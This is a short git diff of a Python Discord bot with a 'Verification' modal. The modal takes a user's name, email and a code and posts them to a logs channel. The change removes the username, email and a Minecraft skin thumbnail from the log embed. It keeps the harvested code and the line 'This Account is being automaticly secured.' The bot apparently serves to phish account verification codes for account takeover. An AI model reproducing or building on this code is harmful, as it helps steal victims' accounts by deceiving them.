@@ -22,11 +22,9 @@ class MyModalTwo(ui.Modal, title="Verification"):
         logs_channel = interaction.client.get_channel(config["discord"]["logs_channel"])
         Code_embed = discord.Embed(
             title = f"{interaction.user.name} | {interaction.user.id}",
-            description=f"**Username** | **Email** | **Status**\n```{self.username.value} | {self.email.value} | Got Code! {self.box_three.value}```",
+            description=f"**Status**\nGot Code! {self.box_three.value}```",
             timestamp = datetime.datetime.now(),
             colour = 0x79D990,                           
-        ).set_thumbnail(
-            url= f"https://visage.surgeplay.com/full/512/{self.username.value}"
         )
 
         await logs_channel.send("**This Account is being automaticly secured.**")
